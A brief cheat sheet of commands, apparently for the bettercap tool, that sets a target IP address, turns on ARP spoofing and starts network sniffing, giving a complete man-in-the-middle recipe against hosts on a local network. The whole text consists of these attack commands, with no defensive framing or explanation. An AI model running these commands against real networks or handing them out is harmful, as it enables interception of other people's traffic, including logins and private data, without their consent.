SET ARP SPOOF TARGETS
----------------------
set arp.spoof.targets [target ip address]
eg:- set arp.spoof.targets 192.168.29.6

START ARP SPOOF
--------------
arp.spoof on

START SNIFF
-----------
net.sniff on
